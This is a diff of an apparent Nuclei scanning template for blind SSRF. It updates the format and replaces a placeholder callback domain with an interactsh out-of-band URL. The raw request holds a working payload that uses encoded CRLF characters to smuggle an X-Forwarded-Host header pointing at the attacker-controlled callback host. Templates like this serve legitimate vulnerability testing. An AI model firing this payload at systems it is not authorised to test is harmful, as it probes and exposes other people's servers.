@@ -1,23 +1,26 @@
-id: 0x106
+id: blind-ssrf-106
 
 info:
   name: Blind SSRF
-  author: 0xAwali
-  severity: info
+  author: reewardius
+  severity: high
+  tags: ssrf
 
-requests:
+http:
   - raw:
-    - |+
-      GET /%20HTTP/1.1\u560d\u560aX-Forwarded-Host:%20{{Host}}.{{Port}}.BSSRF-106.{{MY-DOMAIN}}\u560d\u560a\u560d\u560a HTTP/1.1
-      Host: {{Hostname}}
-      Cache-Control: no-transform
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-      Accept-Encoding: gzip, deflate
-      Accept: */*
+      - |
+        GET /%20HTTP/1.1\u560d\u560aX-Forwarded-Host:%20{{Host}}.{{Port}}.BSSRF-106.{{interactsh-url}}\u560d\u560a\u560d\u560a HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: no-transform
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
 
     unsafe: true
     matchers:
       - type: word
-        part: body
+        part: interactsh_protocol
         words:
-          - "Your Match"
+          - "dns"
+          - "http"
+        condition: or
